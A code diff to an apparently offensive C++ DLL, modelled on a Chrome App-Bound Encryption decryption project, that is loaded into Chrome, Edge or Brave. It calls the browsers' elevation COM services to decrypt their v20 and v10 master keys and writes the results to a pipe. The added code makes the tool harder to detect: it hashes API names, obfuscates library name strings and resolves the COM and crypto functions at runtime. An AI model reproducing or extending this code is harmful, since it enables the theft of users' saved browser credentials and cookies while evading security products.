@@ -29,18 +29,96 @@ https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/blob/f54aa0c609
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 // Global Variables
 
-static PBYTE        g_pbDecryptedKeyV20            = NULL;
-static DWORD        g_cbDecryptedKeyV20            = 0x00;
+static PBYTE                g_pbDecryptedKeyV20            = NULL;
+static DWORD                g_cbDecryptedKeyV20            = 0x00;
 
-static PBYTE        g_pbDecryptedKeyV10            = NULL;
-static DWORD        g_cbDecryptedKeyV10            = 0x00;
+static PBYTE                g_pbDecryptedKeyV10            = NULL;
+static DWORD                g_cbDecryptedKeyV10            = 0x00;
 
-HANDLE              g_hPipe                        = INVALID_HANDLE_VALUE;
-BOOL                g_bPipeInitialized             = FALSE;
-CHAR                g_szProcessName[MAX_PATH]      = { 0 };
-DWORD               g_dwProcessId                  = 0x00;
+HANDLE                      g_hPipe                        = INVALID_HANDLE_VALUE;
+BOOL                        g_bPipeInitialized             = FALSE;
+CHAR                        g_szProcessName[MAX_PATH]      = { 0 };
+DWORD                       g_dwProcessId                  = 0x00;
+
+// DLL-owned instance of the shared resolved functions struct.
+// g_pSharedFunctions (declared in Common.h) points here
+SHARED_RSOLVD_FUNCTIONS     g_SharedFunctions               = {};
+PSHARED_RSOLVD_FUNCTIONS    g_pSharedFunctions              = &g_SharedFunctions;
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
+static BOOL InitializeDllProjDynamicFunctions()
+{
+    HMODULE     hNtdllModule        = NULL,
+                hBCryptModule       = NULL,
+                hCrypt32Module      = NULL,
+                hOle32Module        = NULL;
+    SIZE_T      cbElementCount      = 0x00;
+    PVOID*      ppCurrentElement    = NULL;
+
+    if (g_SharedFunctions.pInitialized) return TRUE;
+
+    RtlSecureZeroMemory(&g_SharedFunctions, sizeof(SHARED_RSOLVD_FUNCTIONS));
+
+    if (!(hNtdllModule = GetModuleHandleH(FNV1A_NTDLLDLL)))
+    {
+        DBGA("[!] GetModuleHandleH Failed To Resolve Modules");
+        return FALSE;
+    }
+
+    if (!(hBCryptModule = LoadLibraryW(OBFW_S(L"bcrypt.dll"))) || !(hCrypt32Module = LoadLibraryW(OBFW_S(L"crypt32.dll"))) || !(hOle32Module = LoadLibraryW(OBFW_S(L"ole32.dll"))))
+    {
+        DBGA("[!] LoadLibraryW Failed To Load Required Modules With Error: %lu", GetLastError());
+        return FALSE;
+    }
+
+    // BCrypt Functions
+    g_SharedFunctions.pBCryptOpenAlgorithmProvider    = (decltype(&BCryptOpenAlgorithmProvider))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTOPENALGORITHMPROVIDER);
+    g_SharedFunctions.pBCryptCloseAlgorithmProvider   = (decltype(&BCryptCloseAlgorithmProvider))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTCLOSEALGORITHMPROVIDER);
+    g_SharedFunctions.pBCryptSetProperty              = (decltype(&BCryptSetProperty))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTSETPROPERTY);
+    g_SharedFunctions.pBCryptGenerateSymmetricKey     = (decltype(&BCryptGenerateSymmetricKey))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTGENERATESYMMETRICKEY);
+    g_SharedFunctions.pBCryptDestroyKey               = (decltype(&BCryptDestroyKey))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDESTROYKEY);
+    g_SharedFunctions.pBCryptFinishHash               = (decltype(&BCryptFinishHash))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTFINISHHASH);
+    g_SharedFunctions.pBCryptDestroyHash              = (decltype(&BCryptDestroyHash))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDESTROYHASH);
+    g_SharedFunctions.pBCryptHashData                 = (decltype(&BCryptHashData))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTHASHDATA);
+    g_SharedFunctions.pBCryptCreateHash               = (decltype(&BCryptCreateHash))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTCREATEHASH);
+    g_SharedFunctions.pBCryptDecrypt                  = (decltype(&BCryptDecrypt))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDECRYPT);
+    g_SharedFunctions.pBCryptDeriveKeyPBKDF2          = (decltype(&BCryptDeriveKeyPBKDF2))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDERIVEKEYPBKDF2);
+    g_SharedFunctions.pBCryptEncrypt                  = (decltype(&BCryptEncrypt))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTENCRYPT);
+
+    // Crypt32 Functions
+    g_SharedFunctions.pCryptStringToBinaryA           = (decltype(&CryptStringToBinaryA))GetProcAddressH(hCrypt32Module, FNV1A_CRYPTSTRINGTOBINARYA);
+    g_SharedFunctions.pCryptUnprotectData             = (decltype(&CryptUnprotectData))GetProcAddressH(hCrypt32Module, FNV1A_CRYPTUNPROTECTDATA);
+
+
+    // Ole32 Functions
+    g_SharedFunctions.pCoSetProxyBlanket              = (decltype(&CoSetProxyBlanket))GetProcAddressH(hOle32Module, FNV1A_COSETPROXYBLANKET);
+    g_SharedFunctions.pCoInitializeEx                 = (decltype(&CoInitializeEx))GetProcAddressH(hOle32Module, FNV1A_COINITIALIZEEX);
+    g_SharedFunctions.pCoCreateInstance               = (decltype(&CoCreateInstance))GetProcAddressH(hOle32Module, FNV1A_COCREATEINSTANCE);
+    g_SharedFunctions.pCoUninitialize                 = (decltype(&CoUninitialize))GetProcAddressH(hOle32Module, FNV1A_COUNINITIALIZE);
+
+     // NTAPI Functions
+    g_SharedFunctions.pNtQuerySystemInformation       = (fnNtQuerySystemInformation)GetProcAddressH(hNtdllModule, FNV1A_NTQUERYSYSTEMINFORMATION);
+
+    // Validate all function pointers (skipping pInitialized)
+    cbElementCount      = (sizeof(SHARED_RSOLVD_FUNCTIONS) / sizeof(PVOID)) - 1;
+    ppCurrentElement    = (PVOID*)&g_SharedFunctions + 1;
+
+    for (SIZE_T i = 0; i < cbElementCount; i++)
+    {
+        if (ppCurrentElement[i] == NULL)
+        {
+            DBGA("[!] GetProcAddressH Failed For Function Of Index: %llu", i);
+            return FALSE;
+        }
+    }
+
+    g_SharedFunctions.pInitialized = (PVOID)TRUE;
+    return TRUE;
+}
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
 
 static VOID GetElevatorGuids(IN BROWSER_TYPE Browser, OUT CONST CLSID** ppClsid, OUT CONST IID** ppIid)
 {
@@ -238,7 +316,7 @@ static BOOL ExtractDecryptedV20KeyFromLocalState(IN BROWSER_TYPE Browser)
         return FALSE;
     }
 
-    if (FAILED((hResult = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))))
+    if (FAILED((hResult = g_SharedFunctions.pCoInitializeEx(NULL, COINIT_APARTMENTTHREADED))))
     {
         DBGA("[!] CoInitializeEx Failed With Error: 0x%08X", hResult);
         return FALSE;
@@ -248,13 +326,13 @@ static BOOL ExtractDecryptedV20KeyFromLocalState(IN BROWSER_TYPE Browser)
     // Msedge
     if (Browser == BROWSER_EDGE)
     {
-        if (FAILED((hResult = CoCreateInstance(reinterpret_cast<REFCLSID>(*pClsid), NULL, CLSCTX_LOCAL_SERVER, reinterpret_cast<REFIID>(*pIid), (LPVOID*)&pElevatorEdge))))
+        if (FAILED((hResult = g_SharedFunctions.pCoCreateInstance(reinterpret_cast<REFCLSID>(*pClsid), NULL, CLSCTX_LOCAL_SERVER, reinterpret_cast<REFIID>(*pIid), (LPVOID*)&pElevatorEdge))))
         {
             DBGA("[!] CoCreateInstance [%d] Failed With Error: 0x%08X", __LINE__, hResult);
             goto _END_OF_FUNC;
         }
 
-        hResult = CoSetProxyBlanket(
+        hResult = g_SharedFunctions.pCoSetProxyBlanket(
             (IUnknown*)pElevatorEdge,
             RPC_C_AUTHN_DEFAULT,
             RPC_C_AUTHZ_DEFAULT,
@@ -268,7 +346,7 @@ static BOOL ExtractDecryptedV20KeyFromLocalState(IN BROWSER_TYPE Browser)
     // Chrome or Brave
     else 
     {
-        if (FAILED((hResult = CoCreateInstance(reinterpret_cast<REFCLSID>(*pClsid), NULL, CLSCTX_LOCAL_SERVER, reinterpret_cast<REFIID>(*pIid), (LPVOID*)&pElevator))))
+        if (FAILED((hResult = g_SharedFunctions.pCoCreateInstance(reinterpret_cast<REFCLSID>(*pClsid), NULL, CLSCTX_LOCAL_SERVER, reinterpret_cast<REFIID>(*pIid), (LPVOID*)&pElevator))))
         {
             if (hResult == E_NOINTERFACE && Browser == BROWSER_CHROME)
             {
@@ -277,7 +355,7 @@ static BOOL ExtractDecryptedV20KeyFromLocalState(IN BROWSER_TYPE Browser)
 
                 DBGV("[i] Falling Back To Chrome's V1 IID ...");
 
-                if (FAILED((hResult = CoCreateInstance(reinterpret_cast<REFCLSID>(*pClsid), NULL, CLSCTX_LOCAL_SERVER, reinterpret_cast<REFIID>(*pIid), (LPVOID*)&pElevator))))
+                if (FAILED((hResult = g_SharedFunctions.pCoCreateInstance(reinterpret_cast<REFCLSID>(*pClsid), NULL, CLSCTX_LOCAL_SERVER, reinterpret_cast<REFIID>(*pIid), (LPVOID*)&pElevator))))
                 {
                     DBGA("[!] CoCreateInstance [%d] Failed With Error: 0x%08X", __LINE__, hResult);
                     goto _END_OF_FUNC;
@@ -290,7 +368,7 @@ static BOOL ExtractDecryptedV20KeyFromLocalState(IN BROWSER_TYPE Browser)
             }
         }
 
-        hResult = CoSetProxyBlanket(
+        hResult = g_SharedFunctions.pCoSetProxyBlanket(
             (IUnknown*)pElevator,
             RPC_C_AUTHN_DEFAULT,
             RPC_C_AUTHZ_DEFAULT,
@@ -372,7 +450,7 @@ _END_OF_FUNC:
     if (pElevatorEdge)
         pElevatorEdge->lpVtbl->Release(pElevatorEdge);
 
-    CoUninitialize();
+    g_SharedFunctions.pCoUninitialize();
 
     return bResult;
 }
@@ -541,6 +619,9 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
 
             g_bPipeInitialized  = InitializeOutputPipe(&g_hPipe);
             BrowserType         = DetectBrowserFromProcess();
+
+            if (!InitializeDllProjDynamicFunctions())
+                break;
 
             DBGV("[+] Detected Browser: %s", GetBrowserName(BrowserType));
 
